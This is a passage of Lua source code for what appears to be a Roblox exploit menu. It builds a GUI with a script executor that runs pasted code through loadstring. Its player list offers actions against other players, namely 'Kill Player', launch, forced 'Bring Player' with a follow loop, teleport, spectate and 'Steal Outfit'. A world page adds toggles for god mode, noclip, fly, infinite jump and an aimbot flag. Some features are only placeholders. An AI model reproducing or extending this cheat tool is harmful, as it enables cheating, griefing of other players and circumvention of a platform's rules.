WorldPage.Size = UDim2.new(1, -20, 1, -70)
WorldPage.Position = UDim2.new(0, 10, 0, 30)
WorldPage.BackgroundTransparency = 1
WorldPage.Visible = false
WorldPage.Parent = main

local function makePage(titleText, page)
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.BackgroundTransparency = 1
    Title.Text = titleText
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Font = Enum.Font.GothamBold
    Title.TextSize = 16
    Title.Parent = page
    return page
end

SettingsPage = makePage("Settings", SettingsPage)
ExecutorPage = makePage("Script Executor", ExecutorPage)
GridPage = makePage("Player List", GridPage)
WorldPage = makePage("World", WorldPage) -- New World title

-- ========== SETTINGS PAGE CONTENT ==========
local sliderTrack = Instance.new("Frame")
sliderTrack.Size = UDim2.new(0, 240, 0, 12)
sliderTrack.Position = UDim2.new(0, 10, 0, 40)
sliderTrack.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sliderTrack.Parent = SettingsPage
local sliderCorner = Instance.new("UICorner", sliderTrack)
sliderCorner.CornerRadius = UDim.new(0, 6)

local sliderKnob = Instance.new("TextButton")
sliderKnob.Size = UDim2.new(0, 12, 0, 20)
sliderKnob.Position = UDim2.new(0, 0, 0.5, -10)
sliderKnob.AutoButtonColor = false
sliderKnob.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sliderKnob.Parent = sliderTrack
local knobCorner = Instance.new("UICorner", sliderKnob)
knobCorner.CornerRadius = UDim.new(0, 4)

local transparencyLabel = Instance.new("TextLabel")
transparencyLabel.Size = UDim2.new(0, 200, 0, 22)
transparencyLabel.Position = UDim2.new(0, 10, 0, 12)
transparencyLabel.BackgroundTransparency = 1
transparencyLabel.Text = "Transparency: 0%"
transparencyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
transparencyLabel.Font = Enum.Font.Gotham
transparencyLabel.TextSize = 14
transparencyLabel.Parent = SettingsPage

local sliderMaxTransparency = 1
local draggingSlider = false
local function setTransparency(percent)
    percent = math.clamp(percent, 0, 1)
    local mapped = percent * sliderMaxTransparency
    main.BackgroundTransparency = mapped
    for _, f in ipairs({sideBar, topBar, tabHolder, BottomBar}) do
        if f and f.Parent then
            f.BackgroundTransparency = mapped * 0.2
        end
    end
    transparencyLabel.Text = string.format("Transparency: %d%%", math.floor(percent * 100))
end

setTransparency(0)

sliderKnob.MouseButton1Down:Connect(function()
    draggingSlider = true
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        draggingSlider = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if draggingSlider and input.UserInputType == Enum.UserInputType.MouseMovement then
        local trackPos = sliderTrack.AbsolutePosition.X
        local trackSize = sliderTrack.AbsoluteSize.X
        local mouseX = UserInputService:GetMouseLocation().X
        local newX = math.clamp(mouseX - trackPos, 0, trackSize)
        sliderKnob.Position = UDim2.new(0, newX, 0.5, -10)
        local percent = 0
        if trackSize > 0 then
            percent = newX / trackSize
        end
        setTransparency(percent)
    end
end)

local keyLabel = Instance.new("TextLabel")
keyLabel.Size = UDim2.new(0, 200, 0, 22)
keyLabel.Position = UDim2.new(0, 10, 0, 80)
keyLabel.BackgroundTransparency = 1
keyLabel.Text = "Toggle Key: (none)"
keyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
keyLabel.Font = Enum.Font.Gotham
keyLabel.TextSize = 14
keyLabel.Parent = SettingsPage

local KeybindBtn = Instance.new("TextButton")
KeybindBtn.Size = UDim2.new(0, 140, 0, 28)
KeybindBtn.Position = UDim2.new(0, 220, 0, 76)
KeybindBtn.Text = "Set Toggle Key"
KeybindBtn.Font = Enum.Font.Gotham
KeybindBtn.TextSize = 14
KeybindBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
KeybindBtn.Parent = SettingsPage
local KeybindCorner = Instance.new("UICorner", KeybindBtn)
KeybindCorner.CornerRadius = UDim.new(0,6)

local capturingKey = false
local toggleKey = nil
KeybindBtn.MouseButton1Click:Connect(function()
    capturingKey = true
    KeybindBtn.Text = "Press any key..."
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if capturingKey and input.UserInputType == Enum.UserInputType.Keyboard then
        capturingKey = false
        toggleKey = input.KeyCode
        KeybindBtn.Text = "Set Toggle Key"
        keyLabel.Text = "Toggle Key: " .. tostring(toggleKey.Name)
    elseif toggleKey and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == toggleKey then
        main.Visible = not main.Visible
    end
end)

local colorPalette = Instance.new("Frame")
colorPalette.Size = UDim2.new(0, 260, 0, 32)
colorPalette.Position = UDim2.new(0, 10, 0, 120)
colorPalette.BackgroundTransparency = 1
colorPalette.Parent = SettingsPage

local paletteColors = {
    Color3.fromRGB(0, 0, 0),
    Color3.fromRGB(30, 30, 30),
    Color3.fromRGB(60, 60, 60),
    Color3.fromRGB(90, 90, 90),
    Color3.fromRGB(120, 120, 120),
    Color3.fromRGB(150, 150, 150),
}

local selectedColor = paletteColors[1]
local function updateAllButtonColors(color)
    selectedColor = color
    HomeBtn.BackgroundColor3 = color
    GridBtn.BackgroundColor3 = color
    SettingsBtn.BackgroundColor3 = color
    CodeBtn.BackgroundColor3 = color
    WorldBtn.BackgroundColor3 = color -- Updated to include WorldBtn
end

local function createColorSwatch(c, x)
    local sw = Instance.new("TextButton")
    sw.Size = UDim2.new(0, 36, 0, 28)
    sw.Position = UDim2.new(0, (x-1)*42, 0, 0)
    sw.BackgroundColor3 = c
    sw.Text = ""
    sw.Parent = colorPalette
    local u = Instance.new("UICorner", sw)
    u.CornerRadius = UDim.new(0,6)
    sw.MouseButton1Click:Connect(function()
        selectedColor = c
        updateAllButtonColors(selectedColor)
    end)
end

for i, c in ipairs(paletteColors) do
    createColorSwatch(c, i)
end

local colorLabel = Instance.new("TextLabel")
colorLabel.Size = UDim2.new(0, 200, 0, 22)
colorLabel.Position = UDim2.new(0, 10, 0, 152)
colorLabel.Text = "UI Color:"
colorLabel.BackgroundTransparency = 1
colorLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
colorLabel.Font = Enum.Font.Gotham
colorLabel.TextSize = 14
colorLabel.Parent = SettingsPage

-- ========== EXECUTOR PAGE CONTENT ==========
local ExecTitle = Instance.new("TextLabel")
ExecTitle.Size = UDim2.new(1, 0, 0, 30)
ExecTitle.Position = UDim2.new(0, 0, 0, 0)
ExecTitle.BackgroundTransparency = 1
ExecTitle.Text = "Script Executor"
ExecTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecTitle.Font = Enum.Font.GothamBold
ExecTitle.TextSize = 16
ExecTitle.Parent = ExecutorPage

local ScriptBox = Instance.new("TextBox")
ScriptBox.Size = UDim2.new(1, -20, 1, -130) -- Adjusted height for OutputLabel
ScriptBox.Position = UDim2.new(0, 10, 0, 40)
ScriptBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScriptBox.Text = "-- Paste your Lua script here"
ScriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptBox.ClearTextOnFocus = false
ScriptBox.TextXAlignment = Enum.TextXAlignment.Left
ScriptBox.TextYAlignment = Enum.TextYAlignment.Top
ScriptBox.MultiLine = true
ScriptBox.TextWrapped = true -- Wrap long lines
ScriptBox.Font = Enum.Font.Code
ScriptBox.TextSize = 14
ScriptBox.Parent = ExecutorPage
local ScriptCorner = Instance.new("UICorner", ScriptBox)
ScriptCorner.CornerRadius = UDim.new(0, 6)

-- Output Label to show execution results
local OutputLabel = Instance.new("TextLabel")
OutputLabel.Size = UDim2.new(1, -20, 0, 40)
OutputLabel.Position = UDim2.new(0, 10, 1, -84)
OutputLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OutputLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
OutputLabel.BackgroundTransparency = 0
OutputLabel.Font = Enum.Font.Gotham
OutputLabel.TextSize = 12
OutputLabel.TextWrapped = true -- Wrap long output
OutputLabel.Text = "Output: Ready"
OutputLabel.Parent = ExecutorPage
local OutputCorner = Instance.new("UICorner", OutputLabel)
OutputCorner.CornerRadius = UDim.new(0, 6)

local ExecBtn = Instance.new("TextButton")
ExecBtn.Size = UDim2.new(0, 120, 0, 32)
ExecBtn.Position = UDim2.new(0, 10, 1, -44)
ExecBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecBtn.Text = "Execute"
ExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecBtn.Font = Enum.Font.GothamBold
ExecBtn.TextSize = 14
ExecBtn.Parent = ExecutorPage
local ExecCorner = Instance.new("UICorner", ExecBtn)
ExecCorner.CornerRadius = UDim.new(0, 6)

local ClearBtn = Instance.new("TextButton")
ClearBtn.Size = UDim2.new(0, 120, 0, 32)
ClearBtn.Position = UDim2.new(0, 140, 1, -44)
ClearBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ClearBtn.Text = "Clear"
ClearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearBtn.Font = Enum.Font.GothamBold
ClearBtn.TextSize = 14
ClearBtn.Parent = ExecutorPage
local ClearCorner = Instance.new("UICorner", ClearBtn)
ClearCorner.CornerRadius = UDim.new(0, 6)

ExecBtn.MouseButton1Click:Connect(function()
    local code = ScriptBox.Text
    if code and #code > 0 then
        OutputLabel.Text = "Output: Executing..."
        local func, err = loadstring(code)
        if func then
            local success, result = pcall(func)
            if success then
                OutputLabel.Text = "Output: Script executed successfully!"
            else
                OutputLabel.Text = "Output: Error - " .. tostring(result)
            end
        else
            OutputLabel.Text = "Output: Loadstring Error - " .. tostring(err)
        end
    else
        OutputLabel.Text = "Output: No script to execute!"
    end
end)

ClearBtn.MouseButton1Click:Connect(function()
    ScriptBox.Text = ""
    OutputLabel.Text = "Output: Ready"
end)

-- ========== GRID PAGE CONTENT ==========
-- Left Frame for Player List
local leftFrame = Instance.new("Frame")
leftFrame.Size = UDim2.new(0.5, -10, 1, -30)
leftFrame.Position = UDim2.new(0, 10, 0, 40)
leftFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
leftFrame.Parent = GridPage
Instance.new("UICorner", leftFrame).CornerRadius = UDim.new(0, 6)

-- Player List Title
local playerListTitle = Instance.new("TextLabel")
playerListTitle.Size = UDim2.new(1, 0, 0, 30)
playerListTitle.Text = "Player List"
playerListTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
playerListTitle.BackgroundTransparency = 1
playerListTitle.Font = Enum.Font.GothamBold
playerListTitle.TextSize = 16
playerListTitle.Parent = leftFrame

-- Search Box
local searchBox = Instance.new("TextBox")
searchBox.Size = UDim2.new(1, -20, 0, 30)
searchBox.Position = UDim2.new(0, 10, 0, 30)
searchBox.PlaceholderText = "Search player..."
searchBox.Text = ""
searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
searchBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
searchBox.Font = Enum.Font.Gotham
searchBox.TextSize = 14
searchBox.Parent = leftFrame
Instance.new("UICorner", searchBox).CornerRadius = UDim.new(0, 6)

-- Player List ScrollingFrame
local playerListScroll = Instance.new("ScrollingFrame")
playerListScroll.Size = UDim2.new(1, -20, 1, -70)
playerListScroll.Position = UDim2.new(0, 10, 0, 70)
playerListScroll.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
playerListScroll.BorderSizePixel = 0
playerListScroll.ScrollBarThickness = 4
playerListScroll.Parent = leftFrame
Instance.new("UICorner", playerListScroll).CornerRadius = UDim.new(0, 6)

local playerListLayout = Instance.new("UIListLayout")
playerListLayout.Padding = UDim.new(0, 5)
playerListLayout.SortOrder = Enum.SortOrder.LayoutOrder
playerListLayout.Parent = playerListScroll

local selectedPlayer = nil
local selectedButton = nil
local broughtPlayers = {} -- To track brought players

local function refreshPlayerList(filter)
    for _, child in ipairs(playerListScroll:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    playerListScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    
    local players = Players:GetPlayers()
    table.sort(players, function(a, b) return a.Name:lower() < b.Name:lower() end)
    
    for _, plr in ipairs(players) do
        if plr ~= LocalPlayer and (filter == "" or string.find(plr.Name:lower(), filter:lower())) then
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, 0, 0, 30)
            btn.Text = plr.Name
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            btn.Font = Enum.Font.Gotham
            btn.TextSize = 14
            btn.Parent = playerListScroll
            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
            
            btn.MouseButton1Click:Connect(function()
                selectedPlayer = plr
                if selectedButton then
                    selectedButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                end
                btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                selectedButton = btn
            end)
        end
    end
    
    playerListScroll.CanvasSize = UDim2.new(0, 0, 0, playerListLayout.AbsoluteContentSize.Y)
end

refreshPlayerList("")

searchBox:GetPropertyChangedSignal("Text"):Connect(function()
    refreshPlayerList(searchBox.Text)
end)

-- Right Frame for Player Options
local rightFrame = Instance.new("Frame")
rightFrame.Size = UDim2.new(0.5, -10, 1, -30)
rightFrame.Position = UDim2.new(0.5, 0, 0, 40)
rightFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
rightFrame.Parent = GridPage
Instance.new("UICorner", rightFrame).CornerRadius = UDim.new(0, 6)

-- Player Options Title
local optionsTitle = Instance.new("TextLabel")
optionsTitle.Size = UDim2.new(1, 0, 0, 30)
optionsTitle.Text = "Player Options"
optionsTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
optionsTitle.BackgroundTransparency = 1
optionsTitle.Font = Enum.Font.GothamBold
optionsTitle.TextSize = 16
optionsTitle.Parent = rightFrame

-- Options ScrollingFrame
local optionsScroll = Instance.new("ScrollingFrame")
optionsScroll.Size = UDim2.new(1, -20, 1, -40)
optionsScroll.Position = UDim2.new(0, 10, 0, 30)
optionsScroll.BackgroundTransparency = 1
optionsScroll.ScrollBarThickness = 4
optionsScroll.Parent = rightFrame

local optionsLayout = Instance.new("UIListLayout")
optionsLayout.Padding = UDim.new(0, 5)
optionsLayout.SortOrder = Enum.SortOrder.LayoutOrder
optionsLayout.Parent = optionsScroll

local function createOptionButton(text)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 35)
    btn.Text = text
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Changed to black
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.Parent = optionsScroll
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    return btn
end

local killBtn = createOptionButton("Kill Player")
killBtn.MouseButton1Click:Connect(function()
    if selectedPlayer and selectedPlayer.Character then
        selectedPlayer.Character:BreakJoints()
    end
end)

local launchBtn = createOptionButton("Launch Player")
launchBtn.MouseButton1Click:Connect(function()
    if selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
        selectedPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 100, 0)
    end
end)

local addFriendBtn = createOptionButton("Add Friend")
addFriendBtn.MouseButton1Click:Connect(function()
    if selectedPlayer then
        -- Placeholder for friend request
        warn("Add friend request to " .. selectedPlayer.Name)
    end
end)

local tpBtn = createOptionButton("TP To Player")
tpBtn.MouseButton1Click:Connect(function()
    if selectedPlayer and selectedPlayer.Character and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = selectedPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, -2)
    end
end)

local propText = Instance.new("TextBox")
propText.Size = UDim2.new(1, 0, 0, 35)
propText.Text = "prop_tree_cedar_02"
propText.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
propText.TextColor3 = Color3.fromRGB(200, 200, 200)
propText.Font = Enum.Font.Gotham
propText.TextSize = 14
propText.Parent = optionsScroll
Instance.new("UICorner", propText).CornerRadius = UDim.new(0, 6)

local spawnPropBtn = createOptionButton("Spawn prop near player")
spawnPropBtn.MouseButton1Click:Connect(function()
    if selectedPlayer and selectedPlayer.Character then
        -- Placeholder for spawning prop
        warn("Spawn " .. propText.Text .. " near " .. selectedPlayer.Name)
    end
end)

local stealOutfitBtn = createOptionButton("Steal Outfit")
stealOutfitBtn.MouseButton1Click:Connect(function()
    if selectedPlayer and selectedPlayer.Character and LocalPlayer.Character then
        -- Simple clothing copy placeholder
        for _, item in ipairs(selectedPlayer.Character:GetChildren()) do
            if item:IsA("Shirt") or item:IsA("Pants") or item:IsA("ShirtGraphic") then
                local clone = item:Clone()
                clone.Parent = LocalPlayer.Character
            end
        end
    end
end)

local spectateBtn = createOptionButton("Spectate Player")
spectateBtn.MouseButton1Click:Connect(function()
    if selectedPlayer and selectedPlayer.Character then
        workspace.CurrentCamera.CameraSubject = selectedPlayer.Character.Humanoid
    end
end)

local unspectateBtn = createOptionButton("Unspectate")
unspectateBtn.MouseButton1Click:Connect(function()
    if LocalPlayer.Character then
        workspace.CurrentCamera.CameraSubject = LocalPlayer.Character.Humanoid
    end
end)

local broughtPlayers = {}
local originalPositions = {}

local bringBtn = createOptionButton("Bring Player")
bringBtn.MouseButton1Click:Connect(function()
    if selectedPlayer and selectedPlayer.Character and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        local targetHRP = selectedPlayer.Character:FindFirstChild("HumanoidRootPart")

        if targetHRP and not broughtPlayers[selectedPlayer] then
            -- ‚úÖ Save original position
            originalPositions[selectedPlayer] = targetHRP.CFrame

            -- ‚úÖ Bring in front
            targetHRP.CFrame = hrp.CFrame * CFrame.new(0, 0, -5)
            broughtPlayers[selectedPlayer] = true

            -- ‚úÖ Start follow loop
            task.spawn(function()
                while broughtPlayers[selectedPlayer] and selectedPlayer.Character and hrp do
                    if targetHRP then
                        -- Keep player in front of you
                        targetHRP.CFrame = hrp.CFrame * CFrame.new(0, 0, -5)
                    end
                    task.wait(0.05)
                end
            end)
        end
    end
end)

local unbringBtn = createOptionButton("Unbring Player")
unbringBtn.MouseButton1Click:Connect(function()
    if selectedPlayer and selectedPlayer.Character and broughtPlayers[selectedPlayer] then
        broughtPlayers[selectedPlayer] = nil
        
        local targetHRP = selectedPlayer.Character:FindFirstChild("HumanoidRootPart")
        if targetHRP and originalPositions[selectedPlayer] then
            -- ‚úÖ Return to original position
            targetHRP.CFrame = originalPositions[selectedPlayer]
            originalPositions[selectedPlayer] = nil
        end
    end
end)

optionsScroll.CanvasSize = UDim2.new(0, 0, 0, optionsLayout.AbsoluteContentSize.Y + 10)

-- ========== WORLD PAGE CONTENT ==========
-- Left Frame for Gameplay & Movement Toggles
local worldLeftFrame = Instance.new("Frame")
worldLeftFrame.Size = UDim2.new(0.5, -10, 1, -30)
worldLeftFrame.Position = UDim2.new(0, 10, 0, 40)
worldLeftFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
worldLeftFrame.Parent = WorldPage
local leftCorner = Instance.new("UICorner", worldLeftFrame)
leftCorner.CornerRadius = UDim.new(0, 6)

-- Left Title
local leftTitle = Instance.new("TextLabel")
leftTitle.Size = UDim2.new(1, 0, 0, 30)
leftTitle.Text = "Gameplay & Movement"
leftTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
leftTitle.BackgroundTransparency = 1
leftTitle.Font = Enum.Font.GothamBold
leftTitle.TextSize = 16
leftTitle.Parent = worldLeftFrame

-- Left ScrollingFrame
local leftScroll = Instance.new("ScrollingFrame")
leftScroll.Size = UDim2.new(1, -20, 1, -40)
leftScroll.Position = UDim2.new(0, 10, 0, 30)
leftScroll.BackgroundTransparency = 1
leftScroll.ScrollBarThickness = 4
leftScroll.Parent = worldLeftFrame

local leftLayout = Instance.new("UIListLayout")
leftLayout.Padding = UDim.new(0, 5)
leftLayout.SortOrder = Enum.SortOrder.LayoutOrder
leftLayout.Parent = leftScroll

-- Toggle states and variables
local godModeEnabled = false
local semiGodEnabled = false
local invisibleGodEnabled = false
local noCollisionEnabled = false
local superJumpEnabled = false
local beastJumpEnabled = false
local customAltitudeEnabled = false
local customFOVEnabled = false
local freecamEnabled = false
local noclipEnabled = false
local infiniteJumpEnabled = false
local flyEnabled = false
local aimbotEnabled = false
local freecamKey = nil
local noclipKey = nil
local altitudeValue = 1.0
local fovValue = 1.0
local freecamSpeed = 1
local noclipSpeed = 1

local function createToggleButton(text, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Text = text
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.Parent = leftScroll
    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0, 6)
    btn.MouseButton1Click:Connect(callback)
    return btn
end

-- God Mode Toggle
local godBtn = createToggleButton("God Mode", function()
    godModeEnabled = not godModeEnabled
    godBtn.BackgroundColor3 = godModeEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    if godModeEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.MaxHealth = math.huge
        LocalPlayer.Character.Humanoid.Health = math.huge
    end
end)

-- Semi God Toggle
local semiGodBtn = createToggleButton("Semi God", function()
    semiGodEnabled = not semiGodEnabled
    semiGodBtn.BackgroundColor3 = semiGodEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    -- Placeholder: e.g., reduce damage taken
end)

-- Invisible God Toggle
local invisibleBtn = createToggleButton("Invisible God", function()
    invisibleGodEnabled = not invisibleGodEnabled
    invisibleBtn.BackgroundColor3 = invisibleGodEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    if LocalPlayer.Character then
        for _, part in ipairs(LocalPlayer.Character:GetChildren()) do
            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                part.Transparency = invisibleGodEnabled and 1 or 0
            end
        end
    end
end)

-- No Collision Toggle
local noCollBtn = createToggleButton("No Collision", function()
    noCollisionEnabled = not noCollisionEnabled
    noCollBtn.BackgroundColor3 = noCollisionEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    if LocalPlayer.Character then
        for _, part in ipairs(LocalPlayer.Character:GetChildren()) do
            if part:IsA("BasePart") then
                part.CanCollide = not noCollisionEnabled
            end
        end
    end
end)

-- Super Jump Toggle
local superJumpBtn = createToggleButton("Super Jump", function()
    superJumpEnabled = not superJumpEnabled
    superJumpBtn.BackgroundColor3 = superJumpEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    -- Jump power handled in UserInputService below
end)

-- Beast Jump Toggle
local beastJumpBtn = createToggleButton("Beast Jump", function()
    beastJumpEnabled = not beastJumpEnabled
    beastJumpBtn.BackgroundColor3 = beastJumpEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    -- Higher jump power
end)

-- Custom Altitude Toggle
local customAltBtn = createToggleButton("Custom Altitude", function()
    customAltitudeEnabled = not customAltitudeEnabled
    customAltBtn.BackgroundColor3 = customAltitudeEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    -- Use altitudeValue for jumps
end)

-- Custom FOV Toggle
local customFOVBtn = createToggleButton("Custom FOV", function()
    customFOVEnabled = not customFOVEnabled
    customFOVBtn.BackgroundColor3 = customFOVEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    if customFOVEnabled then
        workspace.CurrentCamera.FieldOfView = 70 * fovValue
    else
        workspace.CurrentCamera.FieldOfView = 70
    end
end)

-- Infinite Jump Toggle
local infiniteJumpBtn = createToggleButton("Infinite Jump", function()
    infiniteJumpEnabled = not infiniteJumpEnabled
    infiniteJumpBtn.BackgroundColor3 = infiniteJumpEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
end)

-- Fly Toggle
local flyBtn = createToggleButton("Fly", function()
    flyEnabled = not flyEnabled
    flyBtn.BackgroundColor3 = flyEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    -- Fly logic handled below
end)

-- Freecam Section
local freecamLabel = Instance.new("TextLabel")
freecamLabel.Size = UDim2.new(1, 0, 0, 20)
freecamLabel.Text = "Freecam"
freecamLabel.BackgroundTransparency = 1
freecamLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
freecamLabel.Font = Enum.Font.GothamBold
freecamLabel.TextSize = 14
freecamLabel.Parent = leftScroll

local freecamBtn = createToggleButton("Freecam", function()
    freecamEnabled = not freecamEnabled
    freecamBtn.BackgroundColor3 = freecamEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    -- Freecam logic handled below
end)

local freecamKeyLabel = Instance.new("TextLabel")
freecamKeyLabel.Size = UDim2.new(0.7, 0, 0, 20)
freecamKeyLabel.Text = "Freecam Key: NONE"
freecamKeyLabel.BackgroundTransparency = 1
freecamKeyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
freecamKeyLabel.Font = Enum.Font.Gotham
freecamKeyLabel.TextSize = 12
freecamKeyLabel.Parent = leftScroll

local freecamKeyBtn = Instance.new("TextButton")
freecamKeyBtn.Size = UDim2.new(0.3, 0, 0, 20)
freecamKeyBtn.Text = "Set Key"
freecamKeyBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
freecamKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
freecamKeyBtn.Font = Enum.Font.Gotham
freecamKeyBtn.TextSize = 12
freecamKeyBtn.Parent = leftScroll
local freecamKeyCorner = Instance.new("UICorner", freecamKeyBtn)
freecamKeyCorner.CornerRadius = UDim.new(0, 4)

local capturingFreecam = false
freecamKeyBtn.MouseButton1Click:Connect(function()
    capturingFreecam = true
    freecamKeyBtn.Text = "Press Key..."
end)

-- Noclip Section
local noclipLabel = Instance.new("TextLabel")
noclipLabel.Size = UDim2.new(1, 0, 0, 20)
noclipLabel.Text = "Noclip"
noclipLabel.BackgroundTransparency = 1
noclipLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
noclipLabel.Font = Enum.Font.GothamBold
noclipLabel.TextSize = 14
noclipLabel.Parent = leftScroll

local noclipBtn = createToggleButton("Noclip", function()
    noclipEnabled = not noclipEnabled
    noclipBtn.BackgroundColor3 = noclipEnabled and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(0, 0, 0)
    -- Noclip handled in RunService below
end)

local noclipKeyLabel = Instance.new("TextLabel")
noclipKeyLabel.Size = UDim2.new(0.7, 0, 0, 20)
noclipKeyLabel.Text = "Noclip Key: NONE"
noclipKeyLabel.BackgroundTransparency = 1
noclipKeyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
noclipKeyLabel.Font = Enum.Font.Gotham
noclipKeyLabel.TextSize = 12
noclipKeyLabel.Parent = leftScroll

local noclipKeyBtn = Instance.new("TextButton")
noclipKeyBtn.Size = UDim2.new(0.3, 0, 0, 20)
noclipKeyBtn.Text = "Set Key"
noclipKeyBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
noclipKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
noclipKeyBtn.Font = Enum.Font.Gotham
noclipKeyBtn.TextSize = 12
noclipKeyBtn.Parent = leftScroll
local noclipKeyCorner = Instance.new("UICorner", noclipKeyBtn)
noclipKeyCorner.CornerRadius = UDim.new(0, 4)

local capturingNoclip = false
noclipKeyBtn.MouseButton1Click:Connect(function()
    capturingNoclip = true
    noclipKeyBtn.Text = "Press Key..."
end)

leftScroll.CanvasSize = UDim2.new(0, 0, 0, leftLayout.AbsoluteContentSize.Y + 10)

-- Right Frame for Camera Sliders & Functions
local worldRightFrame = Instance.new("Frame")
worldRightFrame.Size = UDim2.new(0.5, -10, 1, -30)
worldRightFrame.Position = UDim2.new(0.5, 0, 0, 40)
worldRightFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
worldRightFrame.Parent = WorldPage
local rightCorner = Instance.new("UICorner", worldRightFrame)
rightCorner.CornerRadius = UDim.new(0, 6)

-- Right Title
local rightTitle = Instance.new("TextLabel")
rightTitle.Size = UDim2.new(1, 0, 0, 30)
rightTitle.Text = "Camera & Functions"
rightTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
rightTitle.BackgroundTransparency = 1
rightTitle.Font = Enum.Font.GothamBold
rightTitle.TextSize = 16
rightTitle.Parent = worldRightFrame

-- Right ScrollingFrame
local rightScroll = Instance.new("ScrollingFrame")
rightScroll.Size = UDim2.new(1, -20, 1, -40)
rightScroll.Position = UDim2.new(0, 10, 0, 30)
rightScroll.BackgroundTransparency = 1
rightScroll.ScrollBarThickness = 4
rightScroll.Parent = worldRightFrame

local rightLayout = Instance.new("UIListLayout")
rightLayout.Padding = UDim.new(0, 10)
rightLayout.SortOrder = Enum.SortOrder.LayoutOrder
rightLayout.Parent = rightScroll

-- Slider creation function (similar to settings)
local function createSlider(labelText, initialValue, min, max, callback)
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, 0, 0, 60)
    container.BackgroundTransparency = 1
    container.Parent = rightScroll

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.4, 0)
    label.BackgroundTransparency = 1
